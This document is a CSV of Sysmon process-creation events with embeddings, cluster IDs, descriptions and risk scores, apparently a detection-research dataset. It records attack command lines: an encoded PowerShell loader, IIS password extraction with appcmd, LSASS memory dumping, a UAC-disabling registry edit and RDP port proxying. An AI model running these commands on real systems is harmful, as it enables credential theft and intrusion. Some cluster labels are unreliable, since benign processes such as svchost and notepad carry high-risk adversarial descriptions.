Timestamp,Computer,Provider,EventID,CommandLine,Embedding,Cluster_DBSCAN,Cluster_KMeans,DBSCANClusterDescription,DBSCANClusterRiskScore
2019-04-18T16:56:24.893827Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\whoami.exe""  /user","[-0.01706688  0.02654537  0.00026673 ...  0.00161245 -0.00056556
 -0.0062398 ]",0,60,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-04-18T16:57:04.681038Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" ","[-0.02468424  0.02283657  0.01598317 ...  0.00842928 -0.0054755
 -0.00916546]",0,91,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-04-27T18:47:00.046849Z,IEWIN7,Microsoft-Windows-Sysmon,1,KeeFarce.exe,"[ 0.00456361  0.00871304  0.01742373 ...  0.01108969  0.00965641
 -0.0011624 ]",116,137,Post-exploitation tools targeting credential theft and sensitive memory extraction from password managers and system processes.,10
2019-05-27T01:28:42.711005Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA==","[-0.00877518  0.02011895  0.02840117 ...  0.01157926  0.00354079
 -0.00127398]",35,45,"Execution of highly obfuscated, multi-stage PowerShell and VBScript payloads utilizing Base64 encoding, Gzip compression, and file masquerading for fileless malware delivery and evasion.",10
2019-05-27T01:29:17.000311Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\InetSRV\appcmd.exe""  list vdir /text:physicalpath","[-0.00327885  0.00493353  0.0020108  ...  0.01938294 -0.00499941
 -0.01273559]",36,79,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:17.110469Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppools /text:name","[-0.00770458  0.03284918  0.02283464 ...  0.01815589  0.00041596
 -0.00867038]",36,7,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:17.190585Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""ERROR ( message:Configuration error "" /text:processmodel.username","[-0.01011806  0.02668067  0.01286291 ...  0.01537546  0.00863245
 -0.01955395]",36,7,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:17.270700Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""ERROR ( message:Configuration error "" /text:processmodel.password","[-0.00094667  0.03655893  0.02489097 ...  0.01355922  0.01294156
 -0.01453643]",36,255,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:17.350815Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.username","[-0.01352244  0.03364477  0.01104593 ...  0.01556327  0.00094006
 -0.01253066]",36,7,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:17.581146Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.password","[-0.00631374  0.04310622  0.02363323 ...  0.01389516  0.00644317
 -0.00911852]",36,255,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:17.661261Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Filename: redirection.config"" /text:processmodel.username","[-0.00634846  0.01173357  0.01641466 ...  0.01170433  0.00060089
 -0.01577357]",36,7,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:17.731362Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Filename: redirection.config"" /text:processmodel.password","[-0.00066836  0.0231124   0.02769399 ...  0.01030398  0.00412612
 -0.01184472]",36,255,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:17.971708Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Line Number: 0"" /text:processmodel.username","[-0.01030534  0.02708756  0.01042776 ...  0.01863229 -0.00040327
 -0.01502015]",36,7,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:18.041809Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Line Number: 0"" /text:processmodel.password","[-0.00269604  0.03711337  0.02132006 ...  0.01554355  0.00383515
 -0.01043595]",36,255,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:18.282154Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Description: Cannot read configuration file due to insufficient permissions"" /text:processmodel.username","[-0.01022201  0.02606096  0.01930532 ...  0.01507957  0.00775497
 -0.01743022]",36,7,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:18.352255Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Description: Cannot read configuration file due to insufficient permissions"" /text:processmodel.password","[-0.00280432  0.03263106  0.02633064 ...  0.01284448  0.0123579
 -0.01286552]",36,255,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:18.662701Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool "". )"" /text:processmodel.username","[-0.0087338   0.02958656  0.01230091 ...  0.01677345 -0.00249001
 -0.0106329 ]",36,7,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:18.742817Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool "". )"" /text:processmodel.password","[-0.00039521  0.03974396  0.02318692 ...  0.01538927  0.00417355
 -0.00840712]",36,255,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:18.822932Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:vdir.name","[-0.01158095  0.0075068   0.00457216 ...  0.02096229 -0.00265982
 -0.00775953]",36,79,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:18.893033Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""ERROR ( message:Configuration error "" /text:userName","[-0.00524544  0.01367587 -0.00261392 ...  0.01228552  0.00056829
 -0.01851422]",36,209,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:18.973148Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""ERROR ( message:Configuration error "" /text:password","[ 0.00014093  0.02179065  0.00519097 ...  0.01115461  0.00954606
 -0.01337581]",36,79,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:19.063277Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:userName","[-0.0099906   0.00927021 -0.00588481 ...  0.01569812 -0.00573826
 -0.01574214]",36,209,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:19.143393Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:password","[-0.01038622  0.02187348  0.0019743  ...  0.01286755  0.00740152
 -0.01022402]",36,79,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:19.233522Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Filename: redirection.config"" /text:userName","[-0.01003422  0.00301894 -0.00135145 ...  0.01080793 -0.00830292
 -0.01250734]",36,209,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:19.323652Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Filename: redirection.config"" /text:password","[-0.00715209  0.01047117  0.00547894 ...  0.01069335  0.00471077
 -0.00761064]",36,51,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:19.563997Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Line Number: 0"" /text:userName","[-0.00962399  0.00707049 -0.00886497 ...  0.0147847  -0.00869439
 -0.01521863]",36,209,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:19.784314Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Line Number: 0"" /text:password","[-0.00848023  0.01731344 -0.00193998 ...  0.01430766  0.00316565
 -0.00766065]",36,79,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:20.034674Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Description: Cannot read configuration file due to insufficient permissions"" /text:userName","[-0.00928358  0.01233976 -0.00108854 ...  0.01255855  0.00384312
 -0.0151422 ]",36,209,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:20.124804Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Description: Cannot read configuration file due to insufficient permissions"" /text:password","[-0.00275542  0.02032896  0.00493772 ...  0.00823039  0.0091662
 -0.01008172]",36,79,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:20.435250Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir "". )"" /text:userName","[-0.00708898  0.01606766 -0.00418376 ...  0.01418428 -0.00815835
 -0.01363878]",36,209,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2019-05-27T01:29:20.555423Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir "". )"" /text:password","[-0.00546407  0.02466121  0.00066501 ...  0.01317595  0.0080821
 -0.0060083 ]",36,79,IIS configuration discovery and credential extraction targeting application pools and virtual directories via appcmd.exe.,8
2021-04-22T22:09:25.389633Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,PPLdump.exe  -v lsass lsass.dmp,"[-0.00430816  0.01717317  0.00634295 ...  0.00573509  0.00207878
 -0.00864345]",37,189,"Execution of PPLdump to bypass process protections and dump LSASS memory for credential harvesting, including file extension masquerading.",10
2021-04-22T22:09:26.081337Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\system32\services.exe 652 ""lsass.dmp"" a708b1d9-e27b-48bc-8ea7-c56d3a23f99 -v","[-0.02722789  0.04388258  0.01784194 ... -0.00158955  0.00097358
 -0.00393508]",99,238,"Credential harvesting and memory dumping of the LSASS process using specialized extraction tools like gsecdump, WCE, and Procdump.",10
2021-04-22T22:09:35.284225Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k LocalService -p -s fdPHost,"[ 0.01555339  0.02992781  0.02466434 ...  0.03218406 -0.00615651
  0.00160144]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-06-21T07:35:37.185149Z,alice.insecurebank.local,Microsoft-Windows-Sysmon,1,Outflank-Dumpert.exe,"[ 0.00499753 -0.00218174  0.00970618 ...  0.00468016  0.00277568
 -0.00212764]",38,115,Execution of Outflank-Dumpert tools for LSASS memory dumping and credential harvesting.,10
2019-06-21T07:35:50.128026Z,alice.insecurebank.local,Microsoft-Windows-Sysmon,1,"rundll32.exe  .\Outflank-Dumpert-DLL.dll, Dump","[ 0.00472748  0.01130948  0.01097379 ...  0.00441006  0.00275261
 -0.00104994]",38,115,Execution of Outflank-Dumpert tools for LSASS memory dumping and credential harvesting.,10
2019-06-21T07:36:50.450183Z,alice.insecurebank.local,Microsoft-Windows-Sysmon,1,AndrewSpecial.exe,"[-0.01399947  0.01399704  0.01167016 ...  0.01666234  0.00209152
 -0.00363727]",116,188,Post-exploitation tools targeting credential theft and sensitive memory extraction from password managers and system processes.,10
2019-08-30T12:54:07.873789Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cscript  c:\ProgramData\memdump.vbs notepad.exe,[0.01317274 0.01917469 0.00971384 ... 0.00430847 0.00478999 0.00129804],101,15,Execution of process memory dumping techniques using scripts and built-in Windows DLLs.,8
2019-08-30T12:54:08.354049Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4868 C:\Windows\System32\notepad.bin full",[0.00701625 0.02625658 0.02481    ... 0.00983382 0.00087013 0.00730327],101,190,Execution of process memory dumping techniques using scripts and built-in Windows DLLs.,8
2019-03-17T20:43:12.784659Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,UI0Detect.exe 220,"[-0.01784806  0.00016665  0.00393242 ...  0.00095532 -0.00921973
 -0.01432517]",30,95,Execution of the Interactive Services Detection utility (UI0Detect.exe) typically used by the system to notify users when a service attempts to interact with the desktop in Session 0.,2
2019-03-17T20:43:16.309727Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,C:\Windows\System32\slui.exe -Embedding,"[-0.01667697  0.0113285   0.01897742 ... -0.00273844 -0.00766677
  0.00345491]",39,113,"Execution of the Windows Activation Client (slui.exe), commonly associated with legitimate licensing tasks or COM-based process launching.",2
2020-09-28T12:47:36.197943Z,DESKTOP-PIU87N6,Microsoft-Windows-Sysmon,1,rdrleakdiag.exe  /p 668 /o C:\Users\wanwan\Desktop /fullmemdmp /snap,"[-0.00778814  0.03530054  0.02932048 ...  0.01090439 -0.01432221
  0.00097498]",120,144,"This cluster indicates high-risk activity including system discovery, potential privilege escalation via Utility Manager, living-off-the-land execution with MSBuild, and explicit EDR alerts for renamed signed binary proxies and driver loading.",9
2020-09-28T12:47:36.215504Z,DESKTOP-PIU87N6,Microsoft-Windows-Sysmon,1,C:\WINDOWS\system32\lsass.exe,"[-0.00654662  0.04505422  0.00296218 ...  0.02290163 -0.00155886
 -0.00317471]",40,14,Execution of the core Windows Local Security Authority Subsystem Service (lsass.exe) from its legitimate system path.,1
2021-12-07T17:33:01.409312Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,MalSeclogon.exe  -p 636 -d 2,"[ 5.3554946e-03  1.7578611e-02 -2.5075910e-03 ... -1.4677886e-06
 -9.7034770e-04 -2.1812840e-03]",41,85,"Execution of MalSeclogon utility, typically used for exploiting the Windows Secondary Logon service to achieve privilege escalation.",9
2021-12-07T17:33:01.474816Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe -k netsvcs -p -s seclogon,"[ 0.00645567  0.03860707  0.00444718 ...  0.02590137 -0.00645765
 -0.00088957]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2021-12-07T17:33:01.636384Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,MalSeclogon.exe  -p 636 -d 2 -l 1,"[ 0.00509085  0.01922911  0.00401706 ...  0.00357572 -0.00129036
  0.00273146]",41,85,"Execution of MalSeclogon utility, typically used for exploiting the Windows Secondary Logon service to achieve privilege escalation.",9
2019-05-26T04:01:42.385505Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Users\IEUser\Desktop\info.rar\jjs.exe"" ","[ 0.02985021  0.01169041  0.02622772 ...  0.01962741 -0.00214194
  0.00894235]",42,38,"Execution of the Java Nashorn engine (jjs.exe) from within an archive-named directory on a user desktop, suggesting potential LOLBin exploitation.",8
2019-05-26T04:01:42.966340Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Users\IEUser\Desktop\info.rar\jjs.exe""","[ 0.02958587  0.0115375   0.02676321 ...  0.02059222 -0.0016907
  0.00859277]",42,38,"Execution of the Java Nashorn engine (jjs.exe) from within an archive-named directory on a user desktop, suggesting potential LOLBin exploitation.",8
2019-05-26T04:01:43.567204Z,IEWIN7,Microsoft-Windows-Sysmon,1,C:\Windows\system32\svchost.exe,"[ 0.00670489  0.03182572  0.01056267 ...  0.03226151 -0.00704847
  0.00043031]",0,11,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2020-02-10T10:08:24.535095Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,ppldump.exe  -p lsass.exe -o a.png,"[-0.00048423  0.03478182  0.02210693 ...  0.01242247  0.01194915
 -0.00698717]",37,189,"Execution of PPLdump to bypass process protections and dump LSASS memory for credential harvesting, including file extension masquerading.",10
2020-09-05T13:28:40.585462Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\WerFault.exe -u -p 3004 -s 632,"[ 0.00214052  0.01273216  0.0256925  ...  0.0143188   0.00272702
 -0.00555808]",43,27,Automated Windows Error Reporting (WER) activity involving WerFault.exe and wermgr.exe for process crash handling and telemetry upload.,1
2020-09-05T13:33:34.590702Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\WerFault.exe -u -p 3668 -s 4420,"[ 0.00422459  0.01541841  0.01288366 ...  0.01344456  0.00689412
 -0.00786689]",43,27,Automated Windows Error Reporting (WER) activity involving WerFault.exe and wermgr.exe for process crash handling and telemetry upload.,1
2020-09-05T13:34:11.983910Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""LogonUI.exe"" /flags:0x4 /state0:0xa3cea855 /state1:0x41c64e6d","[-0.01668606  0.00460969  0.00701565 ...  0.0001342  -0.00614565
 -0.00192641]",33,58,Standard Windows Logon User Interface processes managing session state transitions and credential entry screens.,1
2020-09-05T13:37:07.245322Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""LogonUI.exe"" /flags:0x2 /state0:0xa3bd2855 /state1:0x41c64e6d","[-0.0152071   0.00681446  0.01054668 ...  0.00213686 -0.00619854
 -0.00393593]",33,58,Standard Windows Logon User Interface processes managing session state transitions and credential entry screens.,1
2019-05-19T17:32:00.482982Z,DC1.insecurebank.local,Microsoft-Windows-Sysmon,1,attrib  +h nbtscan.exe,"[-0.00585616  0.0128815   0.00552129 ...  0.0136683  -0.00331419
 -0.0128137 ]",121,142,Obfuscation of an offensive network scanning tool via file attribute manipulation combined with the execution of a system update utility.,7
2019-05-23T17:46:04.671625Z,IEWIN7,Microsoft-Windows-Sysmon,1,netsh  I p a v l=8001 listena=1.2.3.4 connectp=3389 c=1.2.3.5,"[-0.01629829  0.00521787  0.00961776 ...  0.00363853 -0.01569192
 -0.00134933]",102,205,Configuration of network port proxying and firewall rules to facilitate RDP connectivity and lateral movement.,9
2020-10-27T10:17:18.397762Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,""".\samir.exe""",[0.01010522 0.01291707 0.02211587 ... 0.00591054 0.00662585 0.00620774],111,212,Administrative system utilities mixed with high-risk activities including UAC bypass via environment variable manipulation and RDP patching tools.,8
2020-09-23T16:49:44.353761Z,01566s-win16-ir.threebeesco.com,Microsoft-Windows-Sysmon,1,C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6},"[ 0.01770809  0.02395614  0.00897532 ...  0.02219491 -0.00445267
 -0.00098394]",44,50,Standard Windows COM+ Surrogate (DllHost.exe) processes hosting various system COM components identified by their Class IDs.,1
2020-09-23T16:49:44.380219Z,01566s-win16-ir.threebeesco.com,Microsoft-Windows-Sysmon,1,C:\Windows\system32\DllHost.exe /Processid:{49F6E667-6658-4BD1-9DE9-6AF87F9FAF85},"[ 0.00421838  0.0281899   0.01743844 ...  0.02119917 -0.00118403
  0.00592767]",44,50,Standard Windows COM+ Surrogate (DllHost.exe) processes hosting various system COM components identified by their Class IDs.,1
2020-09-23T16:50:16.892752Z,01566s-win16-ir.threebeesco.com,Microsoft-Windows-Sysmon,1,C:\Windows\system32\WerFault.exe -u -p 5424 -s 4616,"[ 0.00531114  0.01416673  0.01652299 ...  0.01488937 -0.00334184
 -0.00320423]",43,27,Automated Windows Error Reporting (WER) activity involving WerFault.exe and wermgr.exe for process crash handling and telemetry upload.,1
2020-09-23T16:50:19.821276Z,01566s-win16-ir.threebeesco.com,Microsoft-Windows-Sysmon,1,C:\Windows\system32\wermgr.exe -upload,"[-0.02173377  0.02898222  0.02205634 ...  0.01303521  0.01051316
 -0.00571625]",43,201,Automated Windows Error Reporting (WER) activity involving WerFault.exe and wermgr.exe for process crash handling and telemetry upload.,1
2019-05-16T14:17:15.762708Z,DC1.insecurebank.local,Microsoft-Windows-Sysmon,1,reg  add hklm\software\microsoft\windows\currentversion\policies\system /v EnableLUA /t REG_DWORD /d 0x0 /f,"[-0.0142144   0.01541042 -0.00813241 ...  0.00135203  0.00410973
  0.00428217]",112,269,Registry modifications to disable User Account Control (UAC) and configure Image File Execution Options (IFEO) for persistence or stealth.,8
2020-02-10T08:28:12.856363Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,Furutaka.exe  dummy2.sys,"[ 0.00292846  0.00073205  0.00842012 ...  0.01369163 -0.004941
  0.00452846]",120,200,"This cluster indicates high-risk activity including system discovery, potential privilege escalation via Utility Manager, living-off-the-land execution with MSBuild, and explicit EDR alerts for renamed signed binary proxies and driver loading.",9
2020-07-02T18:00:29.615842Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,chost.exe  payload.bin,"[-0.01544326  0.01041975  0.02499974 ...  0.01862482  0.00248272
  0.00520152]",91,93,Execution of binary payloads using masqueraded system process names.,9
2020-07-02T18:00:29.650400Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,notepad,"[-0.00157023  0.00282435 -0.00143618 ...  0.00882546 -0.00710789
  0.00262873]",0,15,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
